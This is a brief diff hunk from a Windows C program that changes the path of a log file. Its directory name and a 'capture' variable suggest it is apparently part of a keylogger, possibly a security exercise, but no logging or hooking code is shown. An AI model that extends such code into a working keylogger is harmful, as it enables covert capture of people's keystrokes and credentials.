@@ -16,7 +16,7 @@
 #include <windows.h>
 #include <time.h>
 
-#define PATH "C:/dev/securite/canardage_de_touche/test-log.txt" // The path to the log file
+#define PATH "C:/dev/canardage-log.txt" // The path to the log file
 
 int main(){
     char capture;
